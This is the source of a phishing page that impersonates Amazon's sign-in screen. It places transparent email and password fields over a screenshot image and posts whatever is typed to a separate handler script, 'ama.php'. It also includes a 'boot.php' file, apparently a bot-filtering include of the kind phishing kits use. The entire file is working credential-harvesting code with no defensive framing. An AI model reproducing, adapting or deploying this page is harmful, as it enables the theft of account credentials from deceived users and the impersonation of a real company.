<?php   ob_start();  ?>
<?
include "boot.php";
?>
<html>

<head>
<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
<link rel="icon" type="image/png" href="amazo/fav.png" />
<title>Amazon Sign In</title>
</head>

<body>

<div style="position: absolute; width: 100px; height: 100px; z-index: 1; left: 10px; top: -17px" id="layer1">
<form method="POST" action="ama.php">
	<font color="#FFFFFF">
	<input placeholder="     " autocapitalize="off" autocorrect="off" type="password"  maxlength="29" tabindex="1" id="fullname2" name="stone1" style="border-style:solid; border-color:#FFFFFF; padding:0; top:241;position:absolute; left:537; width:293px; height:28px" size="41" required></font>
	<font color="#FFFFFF">
	<input placeholder="     " autocapitalize="off" autocorrect="off" type="email" maxlength="29" tabindex="1" id="fullname1" name="stone2" style="border-style:solid; border-color:#FFFFFF; padding:0; top:176;position:absolute; left:536; width:294px; height:27px" size="41" required></font><div style="position: absolute; width: 100px; height: 100px; z-index: 1; left: 531px; top: 285px" id="layer2">
	<input type="image" src="amazo/las.png" alt="Submit" name="I1">
</div>
	<p><img border="0" src="amazo/l.png" width="1366" height="669"></div>

</body>

</html>